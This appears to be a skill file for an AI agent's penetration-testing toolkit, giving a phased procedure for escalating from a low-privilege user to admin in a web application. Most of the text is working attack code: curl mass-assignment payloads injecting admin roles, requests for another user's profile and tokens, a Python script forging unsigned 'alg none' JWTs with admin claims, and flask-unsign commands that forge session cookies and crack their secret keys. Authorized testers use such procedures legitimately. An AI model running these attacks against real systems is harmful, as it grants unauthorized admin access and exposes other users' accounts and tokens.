---
name: vuln-privesc-web
description: "Web application privilege escalation testing — horizontal to vertical escalation, parameter tampering for role bypass, JWT privilege escalation, cookie manipulation, admin panel access via role confusion. Triggers: 'web privilege escalation', 'privilege escalation web', 'role bypass', 'permission bypass', 'admin access bypass', 'privilege escalation app', 'role escalation'."
---

# Web Application Privilege Escalation

Escalate from low-privilege user to admin/elevated access within the web application.

---

## Phase 1: Role & Permission Mapping

```bash
TARGET="https://TARGET"
USER_TOKEN="LOW_PRIV_TOKEN"
ADMIN_TOKEN="ADMIN_TOKEN"  # if you have one for comparison

# Map your current permissions:
curl -s -H "Authorization: Bearer $USER_TOKEN" "$TARGET/api/v1/me" | jq '{role, permissions, is_admin}'

# Compare admin vs user API access:
ENDPOINTS=("/api/v1/admin/users" "/api/v1/admin/config" "/api/v1/settings" "/api/v1/roles")
for EP in "${ENDPOINTS[@]}"; do
  USER_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $USER_TOKEN" "$TARGET$EP")
  ADMIN_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $ADMIN_TOKEN" "$TARGET$EP")
  echo "$EP → User: $USER_STATUS | Admin: $ADMIN_STATUS"
done | tee output/privesc_map.txt
```

---

## Phase 2: Parameter Tampering

```bash
TARGET="https://TARGET"
USER_TOKEN="LOW_PRIV_TOKEN"

# Inject admin role via mass assignment:
curl -s -X PUT "$TARGET/api/v1/profile" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bio":"test","role":"admin","is_admin":true,"permissions":["*"]}'

# Manipulate user_id parameter:
MY_ID="123"
ADMIN_ID="1"
curl -s -H "Authorization: Bearer $USER_TOKEN" "$TARGET/api/v1/users/$ADMIN_ID/profile"
curl -s -H "Authorization: Bearer $USER_TOKEN" "$TARGET/api/v1/users/$ADMIN_ID/tokens"

# Try accessing admin endpoints with user token:
curl -s -H "Authorization: Bearer $USER_TOKEN" "$TARGET/api/v1/admin/users" | head -20
curl -s -H "Authorization: Bearer $USER_TOKEN" "$TARGET/api/v1/admin/export" | head -20
```

---

## Phase 3: JWT Manipulation

```bash
TARGET="https://TARGET"
TOKEN="USER_TOKEN"

# Decode JWT:
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Modify role in JWT payload (requires None algorithm or key confusion):
python3 << 'EOF'
import base64, json

# Decode payload:
token = "USER_JWT_TOKEN"
header, payload, sig = token.split(".")
decoded = json.loads(base64.b64decode(payload + "==").decode())
print("Current:", decoded)

# Modify:
decoded["role"] = "admin"
decoded["is_admin"] = True
decoded["permissions"] = ["*"]

# Encode (None algorithm):
new_payload = base64.b64encode(json.dumps(decoded).encode()).decode().rstrip("=")
fake_token = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=") + "." + new_payload + "."
print("Forged:", fake_token)
EOF

# Test forged JWT:
FORGED_TOKEN="FORGED"
curl -s -H "Authorization: Bearer $FORGED_TOKEN" "$TARGET/api/v1/admin/users"
```

---

## Phase 4: Cookie Manipulation

```bash
TARGET="https://TARGET"
SESSION="USER_SESSION_COOKIE"

# Decode and inspect session cookie (Flask, Rails, Express):
# Flask signed cookie:
pip3 install flask-unsign 2>/dev/null
flask-unsign --decode --cookie "$SESSION"
flask-unsign --sign --cookie '{"user_id": 1, "role": "admin", "is_admin": true}' --secret "secret"

# Manipulate base64-encoded session:
echo "$SESSION" | base64 -d 2>/dev/null | python3 -m json.tool

# Try common secret keys:
flask-unsign --unsign --cookie "$SESSION" --wordlist /usr/share/wordlists/rockyou.txt 2>&1 | head -5
```

---

## Output

Save to `output/`:
- `privesc_map.txt` — permission boundary mapping
- `privesc_poc.txt` — steps to achieve privilege escalation

## Next Phase

→ `post-linux-privesc` if web privesc leads to OS-level access
→ `pentest-report` to document findings
